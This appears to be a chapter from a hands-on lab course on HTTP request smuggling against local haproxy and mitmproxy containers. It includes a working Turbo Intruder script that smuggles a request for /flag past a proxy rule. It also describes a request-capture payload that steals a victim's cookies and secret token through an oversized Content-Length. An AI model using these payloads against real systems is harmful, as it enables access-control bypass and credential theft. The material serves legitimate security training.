
We bypassed frontend restrictions and accessed flag in backend.
But can we exploit others?

Actually it is really easy to understand that.

Let's test haproxy first:
Send the following request to intruder and choose null payloads & indefinitely.

![](../Images/5.5%20Exploit%20Connections/req_1.png)

Start the attack! Get your phone and visit http://ip:8001/
Try reloading one or two times! You will see flag downloaded!

Here it how it looks like:
![](../Images/3.5%20HTTP%20Request%20Smuggling/server_side_0.png)

Same thing but in mitmproxy:

![](../Images/5.5%20Exploit%20Connections/req_2.png)

Uncheck update content-length.
Then start attack go to http://ip:8002/

Did it work?
If your docked instance crashed, just restart it (you can also restart spesific service too)

```
sudo docker compose down && sudo docker compose up -d
```

Could you even get 200? It was probably very unstable,  let's change connection pool setting to make it reliable first:

![](../Images/5.5%20Exploit%20Connections/req_3.png)

(Uncheck 'Update Content-Length' and ensure 'Connection Reuse' is enabled. Scroll down to find the option.)

Start attack and watch, can you get 200's? (flags)

This is expected behaviour.
![](../Images/5.5%20Exploit%20Connections/expected.png)
Now go to http://ip:8002

Does it work?

No? What is the reason?

![](../Images/3.5%20HTTP%20Request%20Smuggling/server_side_1.png)

Frontend server creates a tcp connection/tunnel, each data must be send in same connection so they can affect each other.
In our case that is not possible, but it was possible in haproxy.
Even though you can't exploit others in this scenario we already bypassed proxy rule (/flag).

How to do that in turbo intruder extension:

```
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint="http://192.168.1.113:8002",
                           concurrentConnections=1,
                           engine=Engine.THREADED
                           )

    req_attack = """GET /404 HTTP/1.1
Host: we_do_not_need_host
content-length: 4
Transfer-Encoding: heyyy! chunked

31
GET /flag HTTP/1.1
Host: we_do_not_need_host


0

"""
    req_normal = """GET /something HTTP/1.1\r\n\r\n"""

    for i in range(1):
        engine.queue(req_attack)
        engine.queue(req_normal)


def handleResponse(req, interesting):
    table.add(req)

```

you can use \r\n too.

Let's go back to haproxy example.
How do you exploit someone who is using the same connection with the backend as you are?

You can try to smuggle a JavaScript file.  
When a client requests `/index.js`, you can redirect them to your site to fetch `/malicious.js`.  
However, this approach is not very reliable—you might need several attempts.  
And what happens if the backend doesn’t accept your Host header?

You need more than that!

James Kettle and many researchers have demonstrated various exploitation methods.
For example:
```
POST /profile HTTP/1.1\r\n
Host: unhackablesite.test123\r\n
Cookie: notsecret123
Content-Length: 400\r\n
\r\n
username=
```
Imagine you've performed HTTP request smuggling and sent the data to the backend.  
The backend will wait for the rest of the request (since we set the `Content-Length` header to 400).  
But you send nothing!  
If everyone is using the same connection and you've successfully smuggled that request into the backend, you just need to sit and wait.

Some user will send a request:

```
GET /home HTTP/1.1\r\n
Cookie: notsecret123
Secret: secrettoken
Host: unhackablesite.test123\r\n\r\n
```

In backend:
```
POST /profile HTTP/1.1\r\n
Host: unhackablesite.test123\r\n
Cookie: notsecret123
Content-Length: 400\r\n
\r\n
username=GET /home HTTP/1.1\r\n
Cookie: notsecret123
Secret: secrettoken
Host: unhackablesite.test123\r\n\r\n
```
Note: You need to choose the `Content-Length` header carefully—not too large, not too small."

In the end, your username will be replaced by the victim's request (there's a lab about this in portswigger)

We haven't even touched on HTTP/2 desynchronization or h2c attacks yet.  
There are many, _really_ many attack vectors to explore.

If you ever get bored:
scholar.google.com/scholar?q=http+request+smuggling
